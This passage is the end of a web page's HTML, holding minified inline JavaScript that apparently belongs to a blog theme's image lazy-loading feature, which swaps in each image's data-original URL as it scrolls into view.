t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>